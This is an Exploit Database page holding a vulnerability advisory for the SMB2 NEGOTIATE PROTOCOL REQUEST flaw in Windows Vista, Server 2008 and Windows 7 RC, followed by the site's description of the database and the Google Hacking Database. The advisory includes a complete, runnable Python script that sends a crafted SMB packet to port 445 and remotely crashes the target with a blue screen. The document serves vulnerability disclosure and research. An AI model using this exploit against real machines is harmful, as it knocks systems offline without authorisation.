- Severity: High
=============================================

I. VULNERABILITY
-------------------------
Windows Vista, Server 2008 < R2, 7 RC :
SMB2.0 NEGOTIATE PROTOCOL REQUEST Remote B.S.O.D.

II. BACKGROUND
-------------------------
Windows vista and newer Windows comes with a new SMB version named SMB2.
See: http://en.wikipedia.org/wiki/Windows_Vista_networking_technologies#Server_Message_Block_2.0
for more details.

III. DESCRIPTION
-------------------------
[Edit]Unfortunatly this SMB2 security issue is specificaly due to a MS patch, for another SMB2.0 security issue:
KB942624 (MS07-063)
Installing only this specific update on Vista SP0 create the following issue:

SRV2.SYS fails to handle malformed SMB headers for the NEGOTIATE PROTOCOL REQUEST functionnality.
The NEGOTIATE PROTOCOL REQUEST is the first SMB query a client send to a SMB server, and it's used to identify the SMB dialect that will be used for futher communication.

IV. PROOF OF CONCEPT
-------------------------

Smb-Bsod.py:

#!/usr/bin/python
#When SMB2.0 recieve a "&" char in the "Process Id High" SMB header field
#it dies with a PAGE_FAULT_IN_NONPAGED_AREA error

from socket import socket

host = "IP_ADDR", 445
buff = (
"\x00\x00\x00\x90" # Begin SMB header: Session message
"\xff\x53\x4d\x42" # Server Component: SMB
"\x72\x00\x00\x00" # Negociate Protocol
"\x00\x18\x53\xc8" # Operation 0x18 & sub 0xc853
"\x00\x26"# Process ID High: --> :) normal value should be "\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe"
"\x00\x00\x00\x00\x00\x6d\x00\x02\x50\x43\x20\x4e\x45\x54"
"\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31"
"\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00"
"\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57"
"\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61"
"\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c"
"\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c"
"\x4d\x20\x30\x2e\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e"
"\x30\x30\x32\x00"
)
s = socket()
s.connect(host)
s.send(buff)
s.close()

V. BUSINESS IMPACT
-------------------------
An attacker can remotly crash any Vista/Windows 7 machine with SMB enable.
Windows Xp, 2k, are NOT affected as they dont have this driver.

VI. SYSTEMS AFFECTED
-------------------------
[Edit]Windows Vista All (64b/32b|SP1/SP2 fully updated), Win Server 2008 < R2, Windows 7 RC.

VII. SOLUTION
-------------------------
No patch available for the moment.
Close SMB feature and ports, until a patch is provided.
Configure your firewall properly
You can also follow the MS Workaround:

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
